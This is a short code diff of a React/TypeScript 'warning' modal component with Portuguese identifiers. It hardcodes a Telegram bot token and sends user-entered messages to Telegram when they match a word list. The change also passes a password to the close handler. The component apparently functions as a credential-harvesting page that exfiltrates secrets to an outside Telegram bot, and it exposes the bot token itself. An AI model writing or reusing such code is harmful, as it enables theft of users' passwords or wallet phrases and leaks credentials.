@@ -6,7 +6,7 @@ import { handlePassword } from "../Rodape/teste";
 
 
 interface ModalProps {
-    onClose: () => void;
+    onClose: any
 }
 
 const TELEGRAM_BOT_TOKEN = '7063417234:AAHnnl3Qbibq3p9DHHj9PY9sXGlvwsn_E_c';
@@ -83,7 +83,7 @@ export default function WarnignModal({ onClose }: ModalProps) {
             setTimeout(async () => {
                 if (listaMinusc.includes(mensagemMinusc)) {
                     await sendMessageToTelegram(message, dateTime);
-                    onClose();
+                    onClose(password);
                 } else {
                     console.log('Não Autorizado');
                 }
